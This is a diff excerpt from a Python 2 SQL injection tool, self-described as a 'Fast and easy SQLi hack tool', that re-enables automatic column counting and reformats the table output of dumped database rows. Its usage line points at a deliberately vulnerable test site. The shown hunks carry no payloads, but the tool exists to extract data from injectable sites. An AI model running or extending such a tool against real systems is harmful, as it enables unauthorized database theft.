@@ -18,7 +18,7 @@ ____ _              ___      _                     _____
 
 More: https://www.facebook.com/TheCybersTeam
 Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 1.6
+Fast and easy SQLi hack tool Beta 1.7
 """
 print header
 
@@ -70,7 +70,7 @@ def countColumns(url):
     return 0
 
 try:
-    columns = 11 #countColumns(url)
+    columns = countColumns(url)
 except:
     pass
 
@@ -209,7 +209,7 @@ def getData(cols, table,database, volCol, columns, url):
     res = getContent(url)
     data = getVars(res)
     rows = data.split(",")
-    
+
     for j in rows:
         i = 0
         col = j.split(":")
@@ -217,12 +217,26 @@ def getData(cols, table,database, volCol, columns, url):
         for k in col:
             if len(k) > space[i]:
                 space[i] = len(k)
-            i = i + 1
-        
-        line = ""
+            i=i+1
+
+    line = ""
+    i=0
+    for j in cols:
+        line+=j
+        for k in range(len(j),space[i]+2):
+            line+=" "
+
+    print line
+
+    for j in rows:
         i = 0
+        col = j.split(":")
+        line=""
+        i=0
         for k in col:
             line+=k
+            for l in range(len(k),space[i]+2):
+                line +=" "
+            i=i+1
         print line
 getData(cols,table,database,vulCol,columns, url)
-#print "Data: "+data
